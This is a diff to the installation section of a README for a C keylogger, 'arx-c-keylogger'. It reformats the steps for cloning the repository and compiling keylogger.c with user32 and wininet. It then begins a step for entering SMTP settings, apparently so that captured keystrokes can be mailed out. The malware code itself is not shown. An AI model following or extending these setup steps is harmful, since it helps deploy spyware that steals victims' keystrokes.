@@ -23,13 +23,15 @@
 ## Installation
 
 1. **Clone The Project:**
-   ``
-   git clone https://github.com/archescyber/arx-c-keylogger
-   ``
+```
+git clone https://github.com/archescyber/arx-c-keylogger
+```
 1. **Compile the Code**:
    Compile your code with a C compiler. For example:
-   ```bash
-   gcc -o keylogger keylogger.c -luser32 -lwininet
+```
+bash
+gcc -o keylogger keylogger.c -luser32 -lwininet
+```
    
 2. **Configure SMTP Settings:**
  Fill in the following SMTP settings with your information:
